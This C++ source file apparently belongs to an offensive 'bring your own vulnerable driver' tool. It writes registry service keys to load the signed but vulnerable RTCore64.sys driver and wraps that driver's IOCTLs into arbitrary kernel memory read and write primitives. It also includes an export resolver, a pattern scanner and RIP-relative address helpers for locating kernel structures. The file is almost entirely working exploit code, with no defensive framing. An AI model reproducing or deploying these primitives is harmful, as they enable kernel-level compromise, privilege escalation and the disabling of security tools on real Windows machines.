#include "includes.h"
#include <DbgHelp.h>
#include "ntdll.h"


bool helpers::CompareAnsiWide( const char* ansiStr, const wchar_t* wideStr ) {
    while ( *ansiStr && *wideStr ) {
        if ( ( unsigned char )*ansiStr != ( wchar_t )*wideStr ) return false;
        ++ansiStr;
        ++wideStr;
    }
    return *ansiStr == 0 && *wideStr == 0;
}

uintptr_t helpers::GetProcAddress( void* hModule, const wchar_t* wAPIName )
{
    if ( !hModule || !wAPIName ) return 0;

    unsigned char* lpBase = reinterpret_cast< unsigned char* >( hModule );
    IMAGE_DOS_HEADER* idh = reinterpret_cast< IMAGE_DOS_HEADER* >( lpBase );

    if ( idh->e_magic != IMAGE_DOS_SIGNATURE ) return 0;

    IMAGE_NT_HEADERS64* nt = reinterpret_cast< IMAGE_NT_HEADERS64* >( lpBase + idh->e_lfanew );

    if ( nt->Signature != IMAGE_NT_SIGNATURE ) return 0;

    DWORD exportRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

    if ( !exportRVA ) return 0;

    auto exportDir = reinterpret_cast< IMAGE_EXPORT_DIRECTORY* >( lpBase + exportRVA );
    DWORD* nameRVAs = reinterpret_cast< DWORD* >( lpBase + exportDir->AddressOfNames );
    WORD* ordinals = reinterpret_cast< WORD* >( lpBase + exportDir->AddressOfNameOrdinals );
    DWORD* funcRVAs = reinterpret_cast< DWORD* >( lpBase + exportDir->AddressOfFunctions );

    for ( DWORD i = 0; i < exportDir->NumberOfNames; ++i ) {
        const char* exportName = reinterpret_cast< const char* >( lpBase + nameRVAs[i] );
        if ( CompareAnsiWide( exportName, wAPIName ) ) {
            WORD ordinal = ordinals[i];
            return reinterpret_cast< uintptr_t >( lpBase + funcRVAs[ordinal] );
        }
    }
    return 0;
}


bool helpers::find_pattern( const uint8_t* base, size_t scanSize, const uint8_t* pattern, size_t patternSize, uint64_t& outAddress ){
    for ( size_t i = 0; i < scanSize - patternSize; i++ ) {
        bool match = true;
        for ( size_t j = 0; j < patternSize; j++ ) {

            if ( j >= 9 && j <= 12 )
                continue;

            if ( base[i + j] != pattern[j] ) {
                match = false;
                break;
            }
        }

        if ( match ) {
            outAddress = reinterpret_cast< uint64_t >( base + i );
            return true;
        }
    }

    return false;
}

void helpers::DeleteService( PWCHAR ServiceName )
{
    // TODO: drv side
    SHDeleteKeyW( HKEY_LOCAL_MACHINE, ServiceName + sizeof( NT_MACHINE ) / sizeof( WCHAR ) - 1 );
}

uint64_t helpers::ResolveRipRelative( uint64_t instrAddress, int32_t offsetOffset, int instrSize ) {
    int32_t relOffset = *reinterpret_cast< int32_t* >( instrAddress + offsetOffset ); // 4 byte cast to avoid overflow into next register
    return instrAddress + offsetOffset + sizeof( int32_t ) + relOffset;
}



bool helpers::read_32( DWORD64 address, uint32_t& buffer ){
    MemoryOperation operation{ 0 };

    operation.address = address;
    operation.size = sizeof( uint32_t );
    operation.data = buffer;

    if ( !DeviceIoControl( helpers::dev, 0x80002048, &operation, sizeof( operation ), &operation, sizeof( operation ), NULL, NULL ) )
        return false;

    buffer = static_cast< uint32_t >( operation.data );
    return true;
}

bool helpers::write_32( DWORD64 address, uint32_t value )
{
    MemoryOperation operation{ 0 };
    operation.address = address;
    operation.size = sizeof( 2 );
    operation.data = value;

    if ( !DeviceIoControl( helpers::dev, 0x8000204C, &operation, sizeof( operation ), &operation, sizeof( operation ), NULL, NULL ) )
        return false;

    return true;
}

bool helpers::read_64( DWORD64 address, DWORD64& buffer ){
    uint32_t low{ 0 };
    uint32_t high{ 0 };

    if ( !helpers::read_32( address, low ) ) return false;

    if ( !helpers::read_32( address + 4, high ) ) return false;

    buffer = ( static_cast< DWORD64 >( high ) << 32 ) | low; 
        return true;
}

bool helpers::write_64( DWORD64 address, DWORD64 value ){
    uint32_t low = value & 0xFFFFFFFF;
    uint32_t high =  value >> 32;

    if ( !helpers::write_32( address, low ) )
        return false;

    if ( !helpers::write_32( address + 4, high ) )
        return false;

    return true;
}



NTSTATUS test::WriteMemoryPrimitive( HANDLE Device, DWORD64 Address, DWORD Value ) {
    helpers::MemoryOperation MemoryRead{};
    IO_STATUS_BLOCK IoStatusBlock{};

    MemoryRead.address = Address;
    MemoryRead.size = sizeof( uint32_t );
    MemoryRead.data = Value;

    RtlZeroMemory( &IoStatusBlock, sizeof( IoStatusBlock ) );

    DWORD BytesReturned{ 0 };

    return DeviceIoControl( Device, RTCORE64_MEMORY_WRITE_CODE, &MemoryRead, sizeof( MemoryRead ), 
       &MemoryRead, sizeof( MemoryRead ), &BytesReturned, nullptr );
}

NTSTATUS test::WriteMemoryDWORD64( HANDLE Device, DWORD64 Address, DWORD64 Value ){
    test::WriteMemoryPrimitive( Device, Address, Value & 0xffffffff );
    test::WriteMemoryPrimitive( Device, Address + 4, Value >> 32 );
    return STATUS_SUCCESS;
}


NTSTATUS helpers::EnsureDeviceHandle( HANDLE* outHandle, PWSTR LoaderServiceName )
{
    *outHandle = nullptr;

    NTSTATUS stat{ STATUS_SUCCESS };

    // Try to open first (driver might already be loaded)
    stat = helpers::OpenDeviceHandle( outHandle, FALSE );
    if ( NT_SUCCESS( stat ) && *outHandle ) return STATUS_INVALID_HANDLE;

    // Try to load the driver
    stat = helpers::LoadDriver( LoaderServiceName );
    if ( !NT_SUCCESS( stat ) ) return STATUS_INVALID_HANDLE;

    wprintf( L"[+] Vuln (RTCore64.sys) loaded successfully\n" );

    std::this_thread::sleep_for( std::chrono::milliseconds( 1500 ) );

    // Try to open device again after loading
    stat = helpers::OpenDeviceHandle( outHandle, 0 );
    if ( !NT_SUCCESS( stat ) || !*outHandle ) return STATUS_INVALID_HANDLE;

    wprintf( L"[*] Device handle opened successfully: %p\n", *outHandle );

    return stat;
}


NTSTATUS helpers::OpenDeviceHandle( PHANDLE DeviceHandle, BOOLEAN PrintErrors )
{
    UNICODE_STRING devName = RTL_CONSTANT_STRING( L"\\Device\\RTCore64" ); 
    /* 
    * rdx,              NT_Object_Manager_namespace ; "\\Device\\RTCore64" 
    * lea               rcx, [rsp+78h+DestinationString] ; DestinationString
    * call              cs:RtlInitUnicodeString
    * lea               rdx, symbolic_link ; "\\DosDevices\\RTCore64"
    * lea               rcx, [rsp+78h+SymbolicLinkName] ; DestinationString
    */

    OBJECT_ATTRIBUTES ObjectAttributes = RTL_CONSTANT_OBJECT_ATTRIBUTES( &devName, OBJ_CASE_INSENSITIVE );
    IO_STATUS_BLOCK IoStatusBlock{};

    const NTSTATUS stat = NtCreateFile( DeviceHandle, SYNCHRONIZE, &ObjectAttributes, &IoStatusBlock, nullptr,
        FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, nullptr, 0 );

    return stat;
}

NTSTATUS helpers::CreateDriverService( PWCHAR ServiceName, PWCHAR FileName )
{
    helpers::FileNameToServiceName( ServiceName, FileName );
    NTSTATUS Status = RtlCreateRegistryKey( RTL_REGISTRY_ABSOLUTE, ServiceName );

    if ( !NT_SUCCESS( Status ) )    return Status;

    WCHAR NtPath[MAX_PATH]{};
    ULONG ServiceType = SERVICE_KERNEL_DRIVER;

    Status = RtlWriteRegistryValue( RTL_REGISTRY_ABSOLUTE, ServiceName, L"ImagePath", REG_SZ, NtPath, helpers::ConvertToNtPath( NtPath, FileName ) );

    if ( !NT_SUCCESS( Status ) )    return Status;

    Status = RtlWriteRegistryValue( RTL_REGISTRY_ABSOLUTE, ServiceName, L"Type", REG_DWORD, &ServiceType, sizeof( ServiceType ) );

    std::wprintf( L"[*] Service Created for %ws\n", FileName );
    return Status;
}


int helpers::ConvertToNtPath( PWCHAR Dst, PWCHAR Src ) {
    if ( !Dst || !Src ) return 0;

    constexpr size_t PrefixLen = 4;

    size_t srcLen = wcslen( Src );
    size_t totalLen = PrefixLen + srcLen;

    if ( totalLen >= MAX_PATH ) return 0;

    // fk it - manual copying
    Dst[0] = L'\\';
    Dst[1] = L'?';
    Dst[2] = L'?';
    Dst[3] = L'\\';

    for ( size_t i = 0; i <= srcLen; ++i ) Dst[PrefixLen + i] = Src[i];

    return static_cast< int >( ( totalLen + 1 ) * sizeof( wchar_t ) );
}

NTSTATUS helpers::LoadDriver( PWCHAR ServiceName ){
    UNICODE_STRING ServiceNameUcs;
    RtlInitUnicodeString( &ServiceNameUcs, ServiceName );
    return NtLoadDriver( &ServiceNameUcs );
}

NTSTATUS helpers::UnloadDriver( PWCHAR ServiceName ){
    UNICODE_STRING ServiceNameUcs;
    RtlInitUnicodeString( &ServiceNameUcs, ServiceName );
    return NtUnloadDriver( &ServiceNameUcs );
}

void helpers::FileNameToServiceName( PWCHAR ServiceName, PWCHAR FileName ) {
    std::wstring fullPath( FileName );

    auto filename = [&]() -> std::wstring {
        size_t lastSlash = fullPath.find_last_of( L"\\/" );
        return ( lastSlash != std::wstring::npos )
            ? fullPath.substr( lastSlash + 1 )
            : fullPath;
    }( );

    auto servicePart = [&]() -> std::wstring {
        size_t dot = filename.find( L'.' );
        return filename.substr( 0, dot );
    }( );

    std::wstring final = std::wstring( SVC_BASE ) + std::wstring( servicePart );

    std::wmemcpy( ServiceName, final.data(), final.size() );
    ServiceName[final.size()] = L'\0';
}